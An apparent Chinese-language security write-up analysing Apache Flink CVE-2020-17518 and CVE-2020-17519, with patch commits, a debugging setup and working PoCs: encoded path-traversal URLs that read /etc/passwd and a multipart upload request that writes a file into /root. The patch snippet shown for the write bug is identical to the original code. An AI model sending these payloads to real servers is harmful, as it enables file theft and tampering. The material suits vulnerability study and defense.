# Flink 任意文件读取和写入

## **一、前言**

Apache Flink 两个高危漏洞(CVE-2020-17518&CVE-2020-17519),分别是任意文件写入和任意文件读取.

## **二、commit 分析**

1、[任意文件读取](https://github.com/apache/flink/commit/b561010b0ee741543c3953306037f00d7a9f0801)

原代码
```java
String filename = handlerRequest.getPathParameter(LogFileNamePathParameter.class);
```

补丁
```java
String filename = new File(handlerRequest.getPathParameter(LogFileNamePathParameter.class)).getName();
```

通过补丁代码，粗略知道`handlerRequest`变量可控, 能够实现任意文件读取.



2、[任意文件写入](https://github.com/apache/flink/commit/a5264a6f41524afe8ceadf1d8ddc8c80f323ebc4)

原代码
```java
final Path dest = currentUploadDir.resolve(new File(fileUpload.getFilename()).getName());
fileUpload.renameTo(dest.toFile());
```

补丁
```java
final Path dest = currentUploadDir.resolve(new File(fileUpload.getFilename()).getName());							fileUpload.renameTo(dest.toFile());
```

通过补丁代码, 粗略知道`fileUpload`变量可控, 能够实现任意文件写入.

## **三、服务搭建 & 路由信息获取**

### ***服务搭建***

1、下载包[flink](https://github.com/apache/flink/releases)

2、开启 jdwp 端口

修改 `cong/flink-conf.yaml` 文件，增加

```java
env.java.opts.jobmanager: "-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=8006"
```

3、IntelliJ IDEA 打开第一步中的项目, 编辑远程调试配置

4、访问 http://ip:8081

### ***路由信息获取***

访问 Flink Web UI, 访问页面, 让页面报错. 我这里通过上传一个非 jar 文件使项目报错, 然后获取日志, 看日志中异常信息

```java
ERROR org.apache.flink.runtime.webmonitor.handlers.JarUploadHandler [] - Exception occurred in REST handler: Only Jar files are
 allowed.
```

然后在 `org.apache.flink.runtime.webmonitor.handlers.JarUploadHandler` 下断点, 重新上传 jar 包. 再次访问时, 能成功触发断点. 通过调用栈, 找到该项目的路由类和路由变量.  

## **四、漏洞分析**

1、任意文件读取

通过上面获取到的路由变量, 在 get 方法请求中找到 JobManagerCustomLogHandler 这个处理类. 然后根据 pattern 获取到 JobManagerCustomLogHandler 能处理 `v1/jobmanager/logs/:filename` 和 `jobmanager/logs/:filename` 两种请求. 通过分析, `filename`可控, 并且对变量值做了两次`url`解码. 所以最终的`payload`有

```java
http://ip:8081/v1/jobmanager/logs/..%252f..%252f..%252f..%252fetc%252fpasswd
http://ip:8081/jobmanager/logs/..%252f..%252f..%252f..%252fetc%252fpasswd
```

2、任意文件写入

任意文件写入触发类是 `org.apache.flink.runtime.rest.FileUploadHandler`, 该类调用发生在路由解析之前, 而且`filename`可控

```java
DiskFileUpload fileUpload = (DiskFileUpload)data;
Preconditions.checkState(fileUpload.isCompleted());
Path dest = this.currentUploadDir.resolve(fileUpload.getFilename());
fileUpload.renameTo(dest.toFile());
LOG.trace("Upload of file {} complete.", fileUpload.getFilename());
```

fileUpload 会先在 /tmp 目录下缓存文件, 然后再通过 filename 将文件移动. 所以构造 poc 如下:


```java
POST /test HTTP/1.1
Host: ip:8081
Content-Length: 208
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryw6W3L7dPchtqPO4f
Origin: http://ip:8081
Referer: http://ip:8081/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundaryw6W3L7dPchtqPO4f
Content-Disposition: form-data; name="xxxx"; filename="/root/test123"
Content-Type: application/octet-stream

test123
------WebKitFormBoundaryw6W3L7dPchtqPO4f--


```


然后我们会在 `/root/` 目录下找到 `test123` 文件. 至于文件上传处理为什么放在路由处理之前, 有一点存疑



## **参考**

https://lists.apache.org/thread.html/rb43cd476419a48be89c1339b527a18116f23eec5b6df2b2acbfef261%40%3Cdev.flink.apache.org%3E

https://lists.apache.org/thread.html/r6843202556a6d0bce9607ebc02e303f68fc88e9038235598bde3b50d%40%3Cdev.flink.apache.org%3E